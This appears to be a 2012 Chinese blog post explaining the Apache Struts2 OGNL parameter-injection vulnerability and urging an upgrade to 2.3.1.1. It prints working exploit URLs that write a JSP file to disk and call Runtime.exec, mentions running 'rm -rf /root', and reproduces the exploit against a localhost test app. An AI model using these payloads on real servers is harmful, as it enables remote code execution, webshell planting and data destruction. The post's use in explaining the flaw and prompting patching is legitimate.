title: struts2代码执行漏洞
id: 129
categories:
  - java
date: 2012-01-09 14:02:19
tags:
---

刚刚[@乌云-漏洞报告平台](http://weibo.com/wooyun2)公布的struts2代码执行漏洞，具体的漏洞说明地址

[https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt](https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt "https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt")

还是热乎的，我大概白话一下。

这个漏洞的级别很高，都升级修补一下。

影响版本是2.3.1和2.3.1之前的版本

解决办法是升级2.3.1.1

漏洞原理（自己理解的）

Struts2的核心是使用的WebWork，处理Action时通过ParametersInterceptor（参数过滤器）调用Action的getter/setter方法来处理http的参数，它将每个http参数声明为一个ONGL语句。

例如

处理请求配置这样

&lt;action name=&quot;Test&quot; class=&quot;example.Test&quot;&gt; 
</br>&nbsp;&nbsp;&nbsp; &lt;result name=&quot;input&quot;&gt;test.jsp&lt;/result&gt; 
</br>&lt;/action&gt;

通过ONGL就可以转换成

/Test.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/wwwroot/sec-consult.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b' 

oh！god！系统权限就有了，想干什么，就可以干什么了。

或者这样

/Test.action?id='%2b(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b' 

想执行什么就可以执行什么了。比如 rm –rf /root..

我根据说明做了一下测试

jdk：1.6

struts:2.2.1

代码如下：

struts.xml
<pre><span>   1:</span><span>&lt;?</span><span>xml</span><span>version</span><span>=&quot;1.0&quot;</span><span>encoding</span><span>=&quot;UTF-8&quot;</span> ?<span>&gt;</span></pre>
</br>
</br><pre><span>   2:</span><span>&lt;!</span><span>DOCTYPE</span><span>struts</span><span>PUBLIC</span></pre>
</br>
</br><pre><span>   3:</span><span>&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></pre>
</br>
</br><pre><span>   4:</span><span>&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span><span>&gt;</span></pre>
</br>
</br><pre><span>   5:</span><span>&lt;</span><span>struts</span><span>&gt;</span></pre>
</br>
</br><pre><span>   6:</span><span>&lt;</span><span>package</span><span>name</span><span>=&quot;default&quot;</span><span>namespace</span><span>=&quot;/&quot;</span><span>extends</span><span>=&quot;struts-default&quot;</span><span>&gt;</span></pre>
</br>
</br><pre><span>   7:</span><span>&lt;</span><span>action</span><span>name</span><span>=&quot;test&quot;</span><span>class</span><span>=&quot;me.dapeng.action.Test&quot;</span><span>&gt;</span></pre>
</br>
</br><pre><span>   8:</span><span>&lt;</span><span>result</span><span>name</span><span>=&quot;input&quot;</span><span>&gt;</span>test.jsp<span>&lt;/</span><span>result</span><span>&gt;</span></pre>
</br>
</br><pre><span>   9:</span><span>&lt;/</span><span>action</span><span>&gt;</span></pre>
</br>
</br><pre><span>  10:</span><span>&lt;/</span><span>package</span><span>&gt;</span></pre>
</br>
</br><pre><span>  11:</span><span>&lt;/</span><span>struts</span><span>&gt;</span></pre>
</br>
</br>
</br>

Test.java

</br>
</br>
</br><pre><span>   1:</span><span>package</span> me.dapeng.action;</pre>
</br>
</br><pre><span>   2:</span>&nbsp; </pre>
</br>
</br><pre><span>   3:</span><span>import</span> com.opensymphony.xwork2.ActionSupport;</pre>
</br>
</br><pre><span>   4:</span>&nbsp; </pre>
</br>
</br><pre><span>   5:</span><span>/**</span></pre>
</br>
</br><pre><span>   6:</span><span> * </span></pre>
</br>
</br><pre><span>   7:</span><span> * @ClassName:Test.java.java</span></pre>
</br>
</br><pre><span>   8:</span><span> * @ClassDescription:测试Struts2漏洞</span></pre>
</br>
</br><pre><span>   9:</span><span> * @Author:dapeng</span></pre>
</br>
</br><pre><span>  10:</span><span> * @CreatTime:2012-1-9 下午1:45:36</span></pre>
</br>
</br><pre><span>  11:</span><span> * </span></pre>
</br>
</br><pre><span>  12:</span><span> */</span></pre>
</br>
</br><pre><span>  13:</span><span>public</span><span>class</span> Test <span>extends</span> ActionSupport {</pre>
</br>
</br><pre><span>  14:</span><span>long</span> id;</pre>
</br>
</br><pre><span>  15:</span>&nbsp; </pre>
</br>
</br><pre><span>  16:</span>     @Override</pre>
</br>
</br><pre><span>  17:</span><span>public</span> String execute() <span>throws</span> Exception {</pre>
</br>
</br><pre><span>  18:</span>         System.out.println(<span>&quot;execute input&quot;</span>);</pre>
</br>
</br><pre><span>  19:</span><span>return</span><span>&quot;input&quot;</span>;</pre>
</br>
</br><pre><span>  20:</span>     }</pre>
</br>
</br><pre><span>  21:</span>&nbsp; </pre>
</br>
</br><pre><span>  22:</span><span>public</span><span>long</span> getId() {</pre>
</br>
</br><pre><span>  23:</span><span>return</span> id;</pre>
</br>
</br><pre><span>  24:</span>     }</pre>
</br>
</br><pre><span>  25:</span>&nbsp; </pre>
</br>
</br><pre><span>  26:</span><span>public</span><span>void</span> setId(<span>long</span> id) {</pre>
</br>
</br><pre><span>  27:</span><span>this</span>.id = id;</pre>
</br>
</br><pre><span>  28:</span>     }</pre>
</br>
</br><pre><span>  29:</span>&nbsp; </pre>
</br>
</br><pre><span>  30:</span> }</pre>
</br>
</br>
</br>test.jsp
</br>
</br>
</br><pre><span>   1:</span> &lt;%@ page language=<span>&quot;java&quot;</span><span>import</span>=<span>&quot;java.util.*&quot;</span> pageEncoding=<span>&quot;ISO-8859-1&quot;</span>%&gt;</pre>
</br>
</br><pre><span>   2:</span> &lt;%@ taglib prefix=<span>&quot;s&quot;</span> uri=<span>&quot;/struts-tags&quot;</span>%&gt;</pre>
</br>
</br><pre><span>   3:</span> &lt;br&gt;</pre>
</br>
</br><pre><span>   4:</span> &lt;s:property value=<span>&quot;id&quot;</span> /&gt;</pre>
</br>
</br>
</br>

请求URL

</br>

[http://localhost:8080/test/test.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/create.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b'](http://localhost:8080/test/test.action?id=&#039;%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/create.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b&#039; "http://localhost:8080/test/test.action?id=&#039;%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/create.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b&#039;")

</br>

结果：

</br>

通过URL产生了自定义的文件，如果你想执行什么脚本都可以了。

</br>

[](http://images.dapeng.me/dapengme/2012/01/struts2_B205/struts2_holes.jpg)[![http://images.dapeng.me/dapengme/2012/01/struts2_B205/struts2_holes_thumb.jpg](http://m2.img.libdd.com/farm3/118/48E585B6FE66C51CE8D30FB4525F2D76_200_80.PNG)</img>](http://images.dapeng.me/dapengme/2012/01/struts2_B205/struts2_holes_thumb.jpg)

</br>

我也值测试了其中一种情况，其他的漏洞测试就不做了，没升级到安全版本的，赶紧升级吧！最近的安全问题很多的，别等出了安全问题，再想办法，亡羊补牢，为时已晚已！